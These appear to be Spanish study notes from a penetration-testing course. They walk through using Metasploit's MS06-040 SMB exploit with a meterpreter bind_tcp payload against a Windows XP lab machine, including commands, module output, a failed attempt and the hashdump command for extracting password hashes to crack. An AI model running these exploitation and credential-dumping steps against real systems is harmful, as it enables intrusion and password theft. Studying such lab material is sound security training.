Explotacion de otras vulnerabilidades con Metasploit

Tipo de payload en particular llamado meterpreter de Metasploit
que nos permite establecer conecciones y usar ciertos  comandos
que el tiene para hacer ciertas funciones que el tienen
dependiendo del sistema operativo al que valla


Prueba winXp =
msf5 > search MS06-040

Matching Modules
================

#  Name                                 Disclosure Date  Rank  Check  Description
-  ----                                 ---------------  ----  -----  -----------
0  exploit/windows/smb/ms06_040_netapi  2006-08-08       good  No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow


msf5 > use 0
msf5 exploit(windows/smb/ms06_040_netapi) > show payloads

@@@@@@@@@@@@@@@@22
vamos a buscar un meterpreter para winXP 86
muchos de los comandos que tiene son comados que tiene
internamente la herramienta y que nos permite realizar diversas
actividades de comandos normales de la maquina de destino


msf5 exploit(windows/smb/ms06_040_netapi) > set payload windows/meterpreter/bind_tcp

@@@@@@@@@@@@@@@@@
Este tipo de payload puede funcionar en dos vias (bind_tcp)
como payload bind and reverse

    bind_tcp = cuando se establece una coneccion bind es hacia
    adelante es decir mi maquina ademas de enviar el exploit
    tambien inicia la coneccion atraves de un saludo tcp

    reverse_tcp = Se envia el exploit y se esta forzando la
        maquina que recibe el exploit a que sea ella la que
        inice la sesion

    La diferencia con esto es que las ip pueden cambiar y la
    forma de hacerlo atraves de un reverse_tcp nos abre la posibilidad de hacer una conexion mas permanente (esto
    nos ayudara para la postexplotacion )


!!!!!!!!!!!!!!!!!!!!
msf5 exploit(windows/smb/ms06_040_netapi) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf5 exploit(windows/smb/ms06_040_netapi) > show options

Module options (exploit/windows/smb/ms06_040_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST                      no        The target address


Exploit target:

   Id  Name
   --  ----
   0   (wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)


msf5 exploit(windows/smb/ms06_040_netapi) > set RHOST 192.168.1.8
RHOST => 192.168.1.8


@@@@@@@@@@@@@@@@@@@
aqui ya hemos seleccionado el payload y set para configurar
sus options


msf5 exploit(windows/smb/ms06_040_netapi) > exploit

[*] 192.168.1.8:445 - Binding to 4b324fc8-1670-01d3-1278-5a47bf6ee188:3.0@ncacn_np:192.168.1.8[\BROWSER] ...
[-] 192.168.1.8:445 - Exploit failed [timeout-expired]: Timeout::Error execution expired
[*] Exploit completed, but no session was created.

@@@@@@@@@@@@2
session no creada
en el caso del profesor si realizo una coneccion con su equipo
victima esta en el prompt remoto de su maquina virtual
el usara el comando


    !!!!!!!!!!!!!!!!!!!!
    meterpreter > hashdump
        este comando nos permite a traves de los archivos de
        registro  de windows optener las llaves de cifrado de las
        contrasenas de los usuarios locales

        estas llaves nos proporciona herramientas para hacer un
        ataque de fuerza bruta op de diccionario e intentar
        optener las contrasenas de los usuarios que esten
        configurados localmente en esta maquina
